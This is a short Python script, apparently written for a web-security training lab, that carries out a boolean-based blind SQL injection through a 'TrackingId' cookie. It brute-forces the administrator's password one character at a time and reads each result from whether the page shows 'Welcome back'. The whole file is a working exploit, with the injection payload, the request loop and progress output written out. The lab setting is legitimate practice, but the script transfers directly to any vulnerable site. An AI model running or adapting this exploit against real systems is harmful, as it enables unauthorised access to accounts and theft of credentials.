#!/usr/bin/env python3

import pwn
import requests
import sys
import signal
import string
import time

# Global progress bars
p1 = pwn.log.progress("Blind SQLI")
p2 = pwn.log.progress("Password")

def def_handler(sig, frame):
    """Handles Ctrl+C to exit the program gracefully."""

    print(f"\n[X] Leaving the program...\n")
    p1.failure("Brute force attack stopped")
    sys.exit(1)

def perform_request(position, char):
    """
    Sends a single request to check if a character matches at a given position.
    Returns True if the server's response indicates a match, False otherwise.
    """
    
    url = "https://0ae60079030c3b608172fcf2005600d3.web-security-academy.net/"
    tracking_id_payload = f"BOX2SV45JAaJer53' and (select substring(password,{position},1) from users where username ='administrator')='{char}'-- -"
    session_cookie = "zyxdJwWMVyHOxxu2nwVxC4dRQwn1fvk3"
    
    cookies = {
        "TrackingId": tracking_id_payload,
        "session": session_cookie
    }
    
    p1.status(cookies["TrackingId"])

    # The request logic is encapsulated here
    r = requests.get(url, cookies=cookies)
    
    return "Welcome back" in r.text

def bruteforce_SQLI():
    """
    Main function to perform the brute-force attack.
    """

    password = ""
    characters = string.ascii_letters + string.digits

    p1.status("Starting brute force attack")
    time.sleep(1)

    for position in range(1, 21):
        for char in characters:
            if perform_request(position, char):
                password = password + char
                p2.status(password)
                break # Move to the next position

if __name__ == "__main__":
    # Setup signal handler
    signal.signal(signal.SIGINT, def_handler)
    
    # Run the main function
    bruteforce_SQLI()
    
    # Final success message after the loop finishes
    p1.success("Attack finished.")
